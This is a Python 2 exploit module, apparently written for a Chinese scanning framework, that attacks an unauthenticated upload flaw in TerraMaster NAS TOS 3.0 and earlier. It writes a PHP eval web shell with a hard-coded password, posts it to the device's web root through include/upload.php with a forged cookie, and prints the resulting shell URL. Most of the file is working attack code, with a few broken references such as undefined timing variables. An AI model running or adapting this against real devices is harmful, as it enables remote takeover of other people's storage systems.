#! /usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys

#模块使用说明
docs = '''

#title              : TerraMaster NAS TOS <= 3.0 Upload
#date               : 20171009
# Exploit           : Unauthenticated Upload as root.Version F2-240
# Vendor            : TerraMaster
# Product           : TOS <= 3.0.30 (running on every NAS)
# Author            : Simone 'evilsocket' Margaritelli <evilsocket@protonmail.com> 
#python_version     : 2.7.5

'''

from modules.exploit import BGExploit
from api.pl_os_operation import pl_get_name
from thirdparty import requests

class PLScan(BGExploit):
    
    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "NAS3.0 Upload",  # 该POC的名称
            "product": "NAS3.0 Upload",  # 该POC所针对的应用名称,
            "product_version": "3.0",  # 应用的版本号
            "desc": '''
                TerraMaster NAS TOS <= 3.0 Upload,漏洞出现在文件
                include/upload.php的targetDir参数中，未经验证直接执行命令
            ''',  # 该POC的描述
            "author": ["mosin"],  # 编写POC者
            "ref": [
                {self.ref.url: ""},  # 引用的url
                {self.ref.bugfrom: ""},  # 漏洞出处
            ],
            "type": self.type.file_upload,  # 漏洞类型
            "severity": self.severity.high,  # 漏洞等级
            "privileged": False,  # 是否需要登录
            "disclosure_date": "2017-02-10",  # 漏洞公开时间
            "create_date": "2017-10-09",  # POC 创建时间
        }

        #自定义显示参数
        self.register_option({
            "target": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "目标IP",
                "Required":"no"
            },
            "port": {
                "default": 8181,
                "convert": self.convert.int_field,
                "desc": "目标端口",
                "Required":"no"
            },
            "debug": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "用于调试，排查poc中的问题",
                "Required":""
            },
            "mode": {
                "default": "exploit",
                "convert": self.convert.str_field,
                "desc": "执行exploit,或者执行payload",
                "Required":""
            }
        })
        
        #自定义返回内容
        self.register_result({
            #检测标志位，成功返回置为True,失败返回False
            "status": False,
            "exp_status":False, #exploit，攻击标志位，成功返回置为True,失败返回False
            #定义返回的数据，用于打印获取到的信息
            "data": {

            },
            #程序返回信息
            "description": "",
            "error": ""
        })
    def upload(self,address, port, filename, path = '/usr/www/' ):
        url = "http://%s:%d/include/upload.php?targetDir=%s" % ( address, port, path )
        try:
            files = { 'file': open( filename, 'rb' ) }
            cookies = { 'kod_name': '1' } # LOL :D
            r = requests.post(url, files=files, cookies=cookies)
            if r.text != '{"jsonrpc" : "2.0", "result" : null, "id" : "id"}':
                print "[+] Unexpected response, exploit might not work:\n%s\n" % r.text
            return True
        except Exception as e:
            print "[-] ERROR: %s" % e
        return False

    def rce(self,address, port):
        filename = 'safe.php'
        with open(filename, 'wb') as fp:
            fp.write('<?php @eval($_POST[mosin]);?>')
        if self.upload( address, port, filename ) == True:
            url = u"http://%s:%d/%s" % ( address, port ,filename)
            return url
        else:
            print_info("[+] Get Shell Fail.")

    def payload(self):
        """
        检测类型
        :return:
        """
        pass

    def exploit(self):
        address = self.option.target['default']
        port = self.option.port['port']
        ok = self.rce(address,port)
        try:
            os.remove('safe.php')
        except Exception:
            print '\n[x] 删除临时文件失败,请手工删除!'
        if ok:
            print '\n[!] 爷,人品暴发了，成功得到Shell：\n\n%s 密码：%s' % (ok, 'mosin')
        else:
            print '\n[x] 报告大爷,本站不存在此漏洞!'
        print '\n报告爷,脚本执行完毕,用时:', time.time() - start, '秒!'


#下面为单框架程序执行，可以省略
if __name__ == '__main__':
    from main import main
    main(PLScan())